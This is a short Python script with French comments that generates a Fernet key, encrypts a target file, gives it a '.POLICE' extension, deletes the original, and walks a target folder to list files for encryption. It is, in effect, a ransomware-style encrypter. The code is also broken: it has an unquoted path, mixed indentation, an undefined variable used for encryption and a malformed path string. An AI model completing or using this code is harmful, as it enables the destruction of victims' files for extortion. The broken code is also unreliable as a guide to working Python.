#!/usr/bin/python3
# coding: utf-8

import os
from cryptography.fernet import Fernet

####creation de la clef
def creation_de_la_clef(tonfas):
	global key
	key = Fernet.generate_key()
	###ecriture de la clef dans un fichier
	with open(f"{tonfas}.key", "wb") as key_file:
		key_file.write(key)

### Lecture du fichier à chiffrer

fichier_a_chiffrer = /home/shadowspy/Bureau/target

def chiffrement_des_donnees(key, fichier_a_chiffrer):
	with open(fichier_a_chiffrer, "rb") as file:
		donnees = file.read()

	my_key = Fernet(key)
    ###chiffrement des donnes a l'aide de la clef
    donnees_chiffrer = tonfas.encrypt(donnees)
    ###On nomme le nom du nouveau fichier avec une extension
    nouveau_fichier_chiffrer = fichier_a_chiffrer + ".POLICE"

    ###On ouvre le nouveau fichier pour mettre le contenu chiffré
    with open(nouveau_fichier_chiffrer, "wb") as file:
		file.write(donnees_chiffrer)

    os.remove(fichier_a_chiffrer)

### Listing des dossiers, sous-dossiers, fichiers pour appliquer le chiffrement
def listing_des_donnees_a_chiffrer():
    mes_elements = ["\\home/shadowspy/Bureau/target\\"]
    for element in mes_elements:
        for root, dirs, files in os.walk(element):
            for file in files:
                print(file)

